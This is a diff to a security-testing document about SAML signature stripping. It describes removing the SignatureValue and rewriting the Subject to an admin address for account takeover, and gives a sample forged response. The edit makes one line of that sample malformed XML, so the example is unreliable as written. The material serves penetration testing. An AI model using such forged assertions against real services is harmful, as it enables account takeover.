@@ -3,7 +3,7 @@
 <hr>
 
 In this test case, an attacker just remove the value of Signature (not element itself).
-The IDP will sign the SAML response and specift the signature in below mentioned element:
+The IDP will sign the SAML response and specifY the signature in below mentioned element:
 
     <ds:SignatureValue></ds:SignatureValue> 
 <hr>
@@ -12,7 +12,7 @@ The IDP will sign the SAML response and specift the signature in below mentioned
 This attack is based on the fact that when there is no signature value present in SAML response, the web application is not going to perform validation at all.
 in this case, an attacker will remove the signature value and modify the Subject to perform account takeover.
 
-The below mentioned is sample containing signature and subject returnd by an IDP:
+The below mentioned is a sample containing signature and subject returnd by an IDP:
 
     <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
       <ds:SignedInfo xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
@@ -60,13 +60,13 @@ The modified SAML response will look like this:
           <ds:DigestValue>8lJpk95uugFQhcvvE7ZcK+ApIBEBojnyrmIirUTlkBM=</ds:DigestValue>
         </ds:Reference>
       </ds:SignedInfo>
-      <ds:SignatureValue/>
+      <ds:SignatureValue><ds:SignatureValue/>
       <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
         <ds:X509Data>
           <ds:X509Certificate>BASE64_ENCODED_VALUE</ds:X509Certificate>
         </ds:X509Data>
       </KeyInfo>
-    </ds:Signature>
+  </ds:Signature>
     <Subject>
       <NameID Format="urn:oasis:names:tc:SAML:2.0:nameid-format:persistent">admin@TEST.COM</NameID>
       <SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
